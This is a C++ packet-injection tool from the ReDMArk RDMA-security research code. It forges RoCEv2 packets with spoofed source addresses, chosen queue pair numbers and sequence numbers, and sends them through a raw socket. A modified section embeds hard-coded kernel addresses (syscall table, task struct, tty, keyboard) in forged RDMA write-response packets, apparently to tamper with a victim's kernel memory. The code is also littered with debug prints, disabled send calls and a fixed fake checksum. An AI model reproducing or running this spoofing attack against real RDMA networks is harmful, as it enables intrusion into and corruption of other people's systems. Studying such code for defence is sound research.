/**
 * ReDMArk: Bypassing RDMA Security Mechanisms
 *
 * Code for injecting rocev2 packets.
 *
 * Copyright (c) 2020-2021 ETH-Zurich. All rights reserved.
 *
 * Author(s): Konstantin Taranov <konstantin.taranov@inf.ethz.ch>
 *
 */

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <linux/udp.h>
#include <zlib.h>
#include <thread>
#include <chrono>

#include <arpa/inet.h>

#define PCKT_LEN 8192
#define ROCEPORT (4791)

#define MLX4_ROCEV2_QP1_SPORT 0xC000

#define htonll(x) ((((uint64_t)htonl(x)) << 32) + htonl((x) >> 32))


#define BTH_DEF_PKEY	(0xffff)
#define BTH_PSN_MASK	(0x00ffffff)
#define BTH_QPN_MASK	(0x00ffffff)
#define BTH_ACK_MASK	(0x80000000)

struct rxe_bth {
	u_int8_t			opcode;
	u_int8_t			flags;
	u_int16_t			pkey;
	u_int32_t			qpn;
	u_int32_t			apsn;
};

struct rxe_reth {
	__be64			va;
	__be32			rkey;
	__be32			len;
};

struct rxe_immdt {
	__be32			imm;
};

struct rxe_aeth {
    u_int8_t ack;
    u_int8_t msn1;
    u_int16_t msn2;
};

struct rxe_payload {
    __be64      va;
};

const int pseudo_header_length = sizeof(struct udphdr) + sizeof(struct iphdr) + sizeof(rxe_bth);
uint8_t pseudo_header[pseudo_header_length];
struct rxe_bth *pseudo_bth = NULL;


void set_pseudo_header(unsigned char *packet){
	struct iphdr *ip4h = NULL;
	struct udphdr *udph;

	memcpy(pseudo_header, packet, pseudo_header_length);
	ip4h = (struct iphdr *)pseudo_header;
	udph = (struct udphdr *)(ip4h + 1);

	ip4h->ttl = 0xff;
	ip4h->check = htons(0xffff);
	ip4h->tos = 0xff;

	udph->check = htons(0xffff);

	pseudo_bth = (struct rxe_bth *)(udph + 1);

	/* exclude bth.resv8a */
	pseudo_bth->qpn |= htonl(~BTH_QPN_MASK);
}



/* Compute a partial ICRC for all the IB transport headers. */
inline uint32_t rxe_icrc_hdr(unsigned char *packet, uint16_t total_paket_size)
{
	/* This seed is the result of computing a CRC with a seed of
	 * 0xfffffff and 8 bytes of 0xff representing a masked LRH. */
	uint32_t crc = (0xdebb20e3)^ 0xffffffff;
	crc = crc32(crc, pseudo_header, pseudo_header_length); //crc32_le
	/* And finish to compute the CRC on the remainder of the headers and payload */
	crc = crc32(crc, packet + pseudo_header_length, total_paket_size - pseudo_header_length);
	return crc;
}



inline uint16_t ip_checksum(struct iphdr *p_ip_header, size_t len)
{
  register int sum = 0;
  uint16_t *ptr = (unsigned short*)p_ip_header;

  while (len > 1){
    sum += *ptr++;
    len -= 2;
  }

  sum = (sum >> 16) + (sum & 0xFFFF);
  sum += (sum >> 16);

  return ~sum;
}

int main(int argc, char** argv){

    printf("Usage: sudo ./spoofv2 <Source IP> <Destination IP> <QP number> <PSN> <remote address> <rkey>\n");
	printf("\t By  default it sends IB Send, unless <remote address> <rkey> are specified\n");

//	uint32_t payloadsize = 1;
	uint32_t payloadsize = 0;
	uint8_t padcount = (0b100 - (payloadsize & 0b11)) & 0b11; // payload must be multiple of 4.
	// other equations for padcount
	//uint8_t padcount = ((payloadsize + 0x3) & 0b11) - (payloadsize & 0b11); // payload must be multiple of 4.
	//uint8_t padcount = (-((int32_t)payload)) & 0x3;
	payloadsize+=padcount;


	unsigned char buffer[PCKT_LEN];
	memset(buffer, 0, PCKT_LEN);
	struct iphdr *ip = (struct iphdr *) buffer;
	struct udphdr *udp = (struct udphdr *) (ip + 1);
	struct rxe_bth *bth = (struct rxe_bth *) (udp + 1);
//	struct rxe_reth *reth = (struct rxe_reth *) ( ((char*)bth) + sizeof(struct rxe_bth) );
    struct rxe_aeth *aeth = (struct rxe_aeth *)( ((char*)bth) + sizeof(struct rxe_bth) );
//    printf("bth size is %d\n", sizeof(struct rxe_bth));
    printf("aeth is %p\n", aeth);
    printf("bth is %p\n", bth);
    struct rxe_payload *pl = (struct rxe_payload *)( ((char*)aeth) + sizeof(struct rxe_aeth));
    uint32_t *payload = (uint32_t *) (pl + 1);
	uint32_t *icrc = (uint32_t *) ( ((char*)bth) + sizeof(struct rxe_bth) + payloadsize  );


	uint16_t total_paket_size = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct rxe_bth) + payloadsize + sizeof(*icrc) ;
    printf("total length now is %d\n", total_paket_size);

	uint8_t opcode = 4; // 4 - IBV_OPCODE_SEND_ONLY
	uint32_t qpn = 123456;
	uint32_t psn = 222;

	if(argc > 4){
		qpn = atoi (argv[3]);
		psn = atoi (argv[4]);
	} else{
     return 0;
    }

    uint32_t qpn_2 = 123456;
    if(argc > 7){
        qpn_2 = atoi (argv[7]);
    }
	uint64_t va;

// #######################################
// Policy_num used for specifying address
// #######################################
	if (qpn == 1)
		va = htonll(0xffffffffa1013480); // task_s
	if (qpn == 2) 
		va = htonll(0xffffffffa11e5e40); // init_net
	if (qpn == 3)
		va = htonll(0xffffffffa0a00260); // syscall
	if (qpn == 4)
		va = htonll(0xffffffffa113d1c0); // proc_root
	if (qpn == 5)
		va = htonll(0xffffffffae1f9860); // tcp4_afinfo
	if (qpn == 6)
		va = htonll(0xffffffffa1188520); // tty
	if (qpn == 7)
		va = htonll(0xffffffffa1713800); // keyboard
//    uint64_t va = atol(argv[5]);
//    uint64_t va = htonll(0xffffffffa11e5e40); // init_net
//    uint64_t va = htonll(0xffffffffa1013480); // task_s
//    uint64_t va = htonll(0xffffffffa0a00260); // syscall
//    uint64_t va = htonll(0xffffffffa10ead30); // module
//    uint64_t va = htonll(0xffffffffa113d1c0); // proc_root
//    uint64_t va = htonll(0xffffffffa0b17d80); // sock
//    uint64_t va = htonll(0xffffffffa0a5ca20); // ext4_dir
//    uint64_t va = htonll(0xffffffffa11ffc60); // tcp6_afinfo
//    uint64_t va = htonll(0xffffffffa11f9860); // tcp4_afinfo
//    uint64_t va = htonll(0xffffffffa1188520); // tty
//    uint64_t va = htonll(0xffffffffa1713800); // keyboard
	
//
    printf("va is %llu \n", va);
//	uint64_t va = (long)(argv[5]);
	if(argc > 6){ // then rdma write
        printf("total length is %d\n", total_paket_size);
        printf("aeth size is %d\n", sizeof(struct rxe_payload));
        printf("keth size is %d\n", sizeof(struct rxe_aeth));
		total_paket_size+= sizeof(struct rxe_aeth);
        total_paket_size+= sizeof(struct rxe_payload);
        printf("total length is %d\n", total_paket_size);
		icrc=icrc + 3;
//		uint32_t rkey = atoi(argv[6]);
//		reth->rkey = htonl(rkey);
//		reth->len = htonl(payloadsize-padcount);
		opcode = 0x10; // - IBV_OPCODE_RDMA_WRITE_ONLY // response
//		opcode = 0x21;
		printf("[%u bytes] RDMA WRITE to QPN=%u with PSN=%u\n",payloadsize-padcount,qpn,psn);
        printf("reaches here 666\n ");
//		printf("VA=%ld, rkey=%u\n", va, rkey);
	}
//    else{
//		printf("[%u bytes] RDMA SEND to QPN=%u with PSN=%u\n",payloadsize-padcount,qpn,psn);
//	}

    printf("reaches here 55");

    ip->ihl      = 5;
	ip->version  = 4;
	ip->tos      = 0; // low delay
	ip->tot_len  = htons(total_paket_size);
//	ip->tot_len  = htons(20);
	ip->id       = htons (21504);	//Id of this packet
	ip->frag_off = htons(0x4000);
//    ip->frag_off = htons(0x0);
	ip->ttl      = 64; // hops
	ip->protocol = 17; // UDP
	// source IP address, can use spoofed address here
	ip->check = 0; // fill later or ignored
    printf("reaches here 3");
    ip->saddr = inet_addr(argv[1]);
	ip->daddr = inet_addr(argv[2]);
    printf("reaches here 222");
	//udp->source = htons(MLX4_ROCEV2_QP1_SPORT);
	udp->source = htons(1111);
    // destination port number
	udp->dest = htons(ROCEPORT);
	udp->len = htons(total_paket_size - sizeof(struct iphdr));
//	udp->len = htons(28);
	udp->check = 0;// fill later or ignored

	//https://github.com/SoftRoCE/rxe-dev/blob/master/drivers/infiniband/hw/rxe/rxe_hdr.h
	bth->opcode = opcode; //8bit
	bth->flags = 0b01000000; // padding is here
//	bth->flags |= padcount << 4 ; // it adds padcount (i.e. how many bytes crop from payload at destination)!

	bth->pkey = htons(BTH_DEF_PKEY);
	bth->qpn = htonl(qpn);

    printf("reaches here 11");
	int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	struct sockaddr_in dst_addr;
	dst_addr.sin_family = AF_INET;
	dst_addr.sin_port = htons(ROCEPORT);
	dst_addr.sin_addr.s_addr = ip->saddr; // modified
	uint32_t totalAttackRounds = 1;
	uint32_t counter = 0;
    printf("reaches here");
    for (int jj = 0; jj <= 0; jj++){
//	while (true) {

		counter = (counter + 1) % 1024;
		if (counter == 0)
        		totalAttackRounds++;
        printf("aeth is %p", aeth);
		pl->va = htonll(va);
        aeth->ack = 0;
        aeth->msn1 = 0;
        aeth->msn2 = 1;
		printf("it is %llx", pl->va);

		bth->apsn = htonl(BTH_PSN_MASK & psn);

		*icrc = htonl(0x33333378);
        printf("\n the total length is %d\n", total_paket_size);
		
        int testing = 0;

        std::chrono::steady_clock::time_point init_start = std::chrono::steady_clock::now();
        std::chrono::steady_clock::time_point init_end = std::chrono::steady_clock::now();
        for (testing =  0; testing < 1; testing ++){
        
			init_start = std::chrono::steady_clock::now();

        // testing RDMA
        
       		int ret;
        	int kk = 0;
        	
//        while(1){
        	int cntt = 0;
        	for (cntt =0; cntt < 1; cntt ++){
        	if(argc > 7){ // SEND SAME PACKET
            	int kk = 0;
            	for (kk = 0; kk < argc - 7; kk++){
//                printf("sending another packet!\n");
                	bth->qpn = htonl(atoi(argv[kk + 7]));
                	init_start = std::chrono::steady_clock::now();
                //ret =  sendto(raw_sock, buffer, total_paket_size, 0, (struct sockaddr *)&dst_addr, sizeof(dst_addr)) ;
		// test spoofing
					if (cntt == 500){
	       	   		 	bth->qpn = htonl(atoi(argv[kk + 7])+1);
		    //ret =  sendto(raw_sock, buffer, total_paket_size, 0, (struct sockaddr *)&dst_addr, sizeof(dst_addr)) ;
					}
        

				}


            	init_end = std::chrono::steady_clock::now();
	    		long elapsed = std::chrono::duration_cast<std::chrono::nanoseconds>(init_end - init_start).count();
        	}
            	if (argc == 8){
            	    bth->qpn = htonl(qpn_2);
            		usleep(50000);
            	    ret =  sendto(raw_sock, buffer, total_paket_size, 0, (struct sockaddr *)&dst_addr, sizeof(dst_addr)) ;
            	}
        	}
        init_end = std::chrono::steady_clock::now();
        long init_elapsed = std::chrono::duration_cast<std::chrono::nanoseconds>(init_end - init_start).count();
        printf("sleep finished. Epalsed time: %lf\n", ((double)init_elapsed)/1000000000.);

        }
		psn+=1;
		printf ("data: %d, location %d\n", totalAttackRounds, counter);
	}

  return 0;
}
